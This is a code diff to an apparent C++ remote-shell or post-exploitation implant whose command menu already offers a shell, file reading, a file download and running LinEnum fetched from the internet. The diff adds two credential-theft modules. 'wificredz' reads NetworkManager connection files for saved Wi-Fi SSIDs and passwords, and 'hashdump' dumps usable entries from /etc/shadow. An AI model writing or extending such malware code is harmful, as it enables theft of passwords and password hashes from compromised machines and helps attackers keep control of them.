@@ -271,11 +271,15 @@ class Modules {
  public:
   void list_modules() {
     std::string modules = "\x1b[32mModules \n";
-    std::string shell = "shell - Executes /bin/sh\n";
-    std::string read_file = "readfile - Print the contents of a file\n";
-    std::string enumerate = "enumerate - Download and run LinEnum "
-      "(requires internet access)\n";
-    std::string download = "download - Downloads a file\n";
+    std::string shell = "shell        Executes /bin/sh\n";
+    std::string read_file = "readfile     Print the contents of a file\n";
+    std::string enumerate = "enumerate    Download and run LinEnum"
+      " (requires internet access)\n";
+    std::string download = "download     Downloads a file\n";
+    std::string wificredz = "wificredz    Gets"
+      " saved wifi passwords (root needed)\n";
+    std::string hashdump = "hashdump     Gets"
+      " system password hashes (root needed)\n";
 
     new_line();
     write(sd(), modules.data(), modules.length());
@@ -284,6 +288,8 @@ class Modules {
     write(sd(), read_file.data(), read_file.length());
     write(sd(), enumerate.data(), enumerate.length());
     write(sd(), download.data(), download.length());
+    write(sd(), wificredz.data(), wificredz.length());
+    write(sd(), hashdump.data(), hashdump.length());
     new_line();
   }
 
@@ -385,6 +391,16 @@ class Modules {
     delete[] command;
   }
 
+  void wificredz() {
+    system("cat /etc/NetworkManager/system-connections/*"
+      " 2>/dev/null | grep -e 'ssid=' -e 'psk='");
+  }
+
+  void hashdump() {
+    system("cat /etc/shadow 2>/dev/null "
+      "| grep -v '*' | grep -v '!'");
+  }
+
  private:
   std::string error = "\x1b[33m Cannot open file.\n";
   FILE *check_curl = fopen("/usr/bin/curl", "rb");
@@ -422,6 +438,8 @@ int handler() {
   std::string enumerate = "enumerate";
   std::string module_list = "modules";
   std::string download = "download";
+  std::string wificredz = "wificredz";
+  std::string hashdump = "hashdump";
   std::string quit = "exit";
   std::string clear = "clear";
   std::string help ="help";
@@ -438,6 +456,10 @@ int handler() {
     modules.list_modules();
   else if (option == download)
     modules.download();
+  else if (option == wificredz)
+    modules.wificredz();
+  else if (option == hashdump)
+    modules.hashdump();
   else if (option == quit)
     return 1;
   else if (option == clear)
